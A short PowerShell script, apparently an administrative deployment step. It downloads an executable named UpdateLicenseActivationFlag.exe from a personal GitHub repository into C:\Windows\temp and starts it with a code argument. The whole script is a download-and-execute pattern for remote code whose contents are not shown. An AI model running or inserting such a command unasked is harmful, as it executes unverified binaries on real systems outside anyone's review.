$url = "https://github.com/murtaza7869/EvertZ/raw/main/UpdateLicenseActivationFlag.exe"
$output = "C:\Windows\temp\UpdateLicenseActivationFlag.exe"
$wc = new-object System.Net.WebClient
$wc.DownloadFile($url, $output)
Start-Process -FilePath "C:\Windows\temp\UpdateLicenseActivationFlag.exe" -ArgumentList "/cc a47944a71e"
